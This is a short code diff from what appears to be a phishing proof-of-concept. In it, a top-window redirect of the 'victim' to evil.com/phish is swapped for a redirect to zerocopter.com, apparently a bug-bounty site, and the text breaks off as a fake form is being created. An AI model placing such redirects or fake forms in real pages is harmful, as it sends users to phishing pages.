@@ -1,5 +1,5 @@
 // Redirect victim out of the app
-window.top.location = "https://evil.com/phish";
+window.top.location = "https://zerocopter.com/";
 
 (function fakeForm() {
   let form = document.createElement("form");
